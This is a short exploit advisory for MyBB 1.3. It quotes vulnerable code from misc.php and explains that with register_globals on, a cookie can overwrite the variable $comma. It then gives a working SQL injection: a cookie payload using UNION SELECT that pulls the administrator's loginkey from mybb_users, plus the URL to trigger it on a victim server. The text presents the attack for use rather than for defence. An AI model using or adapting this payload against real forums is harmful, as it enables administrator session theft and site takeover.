The Inf.File :-
misc.php

Linez :-

[code]
	$buddies = $mybb->user['buddylist'];

	$namesarray = explode(",",$buddies);

	if(is_array($namesarray))

	{

		while(list($key, $buddyid) = each($namesarray))

		{

			$sql .= "$comma'$buddyid'"; <== HERE :) Uncleard Var !!

			$comma = ",";

		}

	$timecut = time() - $mybb->settings['wolcutoff'];

	$query = $db->query("SELECT u.*, g.canusepms FROM ".TABLE_PREFIX."users u LEFT JOIN ".TABLE_PREFIX."usergroups g ON (g.gid=u.usergroup) WHERE u.uid IN ($sql)");
[/code]

From 255 to 265

The GLOBALS unset function .. do not unset $_COOKIES ..
then u can start attacking any var by cookies :)

Tested MyBB 1.3 .. Register_Globals = On

Explorer Exploit :-

1- Login by any username ..
2- Create new cookie (
	name 	=> "comma"
	value	=> "comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=1/*")

3- Check The URL :-
HOST/PATH/misc.php?action=buddypopup

Where HOST = The Vic.Server And PATH = MyBB Dir.
